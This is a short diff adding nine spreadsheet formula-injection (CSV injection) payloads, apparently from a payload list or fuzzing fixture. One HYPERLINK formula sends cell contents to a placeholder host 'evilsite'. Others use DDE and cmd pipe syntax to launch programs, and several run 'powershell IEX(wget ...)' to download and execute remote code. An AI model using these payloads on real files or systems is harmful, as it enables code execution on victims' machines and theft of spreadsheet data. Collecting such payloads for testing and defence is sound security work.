@@ -1,0 +1,9 @@
+=HYPERLINK("http://evilsite?foo="&A1&A2,"Error: please click for further information")
+=DDE("cmd";"/C calc";"__DdeLink_60_870516294")
+=cmd|' /C calc'!A0
+@SUM(1+2+3)*cmd|' /C calc'!A0
+@SUM(1+1)*cmd|' /C calc'!A0 
+":";-3+3+cmd|' /C calc'!D2
+=cmd|'/C powershell IEX(wget foo.bar/p)'!A0
+@SUM(1+2+3)*cmd|'/C powershell IEX(wget 0r.pe/p)'!A0
+@SUM(1+1)*cmd|' powershell IEX(wget 0r.pe/p)'!A0
